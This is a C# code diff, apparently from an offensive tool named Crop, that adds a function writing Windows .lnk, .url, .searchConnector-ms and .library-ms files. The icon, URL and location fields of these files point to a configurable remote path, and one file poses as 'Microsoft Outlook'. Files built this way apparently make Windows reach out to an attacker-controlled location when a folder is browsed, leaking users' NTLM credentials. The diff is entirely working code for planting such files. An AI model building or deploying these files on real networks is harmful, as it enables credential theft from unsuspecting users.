@@ -165,14 +165,67 @@ namespace Crop
         }
 
         #endregion
-        public static void CreateCrop()
+        public static void CreateLNKCrop(string destOut)
         {
             var shellLink = new ShellLink();
             ((IShellLinkW)shellLink).SetDescription("Shortcut");
             ((IShellLinkW)shellLink).SetPath(Config.targetPath);
             ((IShellLinkW)shellLink).SetIconLocation(Config.targetIcon, 12);
-            ((IPersistFile)shellLink).Save(Config.targetLocation, false);
+            ((IPersistFile)shellLink).Save(destOut, false);
 
+        }
+
+        public static void CreateFileCrop(string destOut)
+        {
+            var urlstr = "[InternetShortcut]\nURL=farmer\nWorkingDirectory=farmer\nIconFile=" + Config.targetPath + "\\%USERNAME%.icon\nIconIndex=1";
+
+            var searchconnectorstr =
+                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                "<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">\n" +
+                "    <iconReference>imageres.dll,-1002</iconReference>\n" +
+                "    <description>Microsoft Outlook</description>\n" +
+                "    <isSearchOnlyItem>false</isSearchOnlyItem>\n" +
+                "    <includeInStartMenuScope>true</includeInStartMenuScope>\n" +
+                "    <iconReference>" + Config.targetPath + "</iconReference>\n" +
+                "    <templateInfo>" +
+                "        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>\n" +
+                "    </templateInfo>\n" +
+                "    <simpleLocation>\n" +
+                "        <url>" + Config.targetPath + "</url>\n" +
+                "    </simpleLocation>\n" +
+                "</searchConnectorDescription>\n";
+
+            var librarymsstr =
+                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                "<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n" +
+                "  <name>@windows.storage.dll,-34582</name>\n" +
+                "  <version>6</version>\n" +
+                "  <isLibraryPinned>true</isLibraryPinned>\n" +
+                "  <iconReference>imageres.dll,-1003</iconReference>\n" +
+                "  <templateInfo>" +
+                "    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n" +
+                "  </templateInfo>\n" +
+                "  <searchConnectorDescriptionList>\n" +
+                "    <searchConnectorDescription>\n" +
+                "      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n" +
+                "      <isSupported>false</isSupported>\n" +
+                "      <simpleLocation>\n" +
+                "      <url>" + Config.targetPath + "</url>\n" +
+                "      </simpleLocation>\n" +
+                "    </searchConnectorDescription>\n" +
+                "  </searchConnectorDescriptionList>\n" +
+                "</libraryDescription>";
+
+            var output = "";
+
+            if (Config.targetFilename.ToLower().EndsWith(".url"))
+                output = urlstr;
+            else if (Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
+                output = searchconnectorstr;
+            else if (Config.targetFilename.ToLower().EndsWith(".library-ms"))
+                output = librarymsstr;
+
+            System.IO.File.WriteAllText(destOut, output);
         }
     }
 }
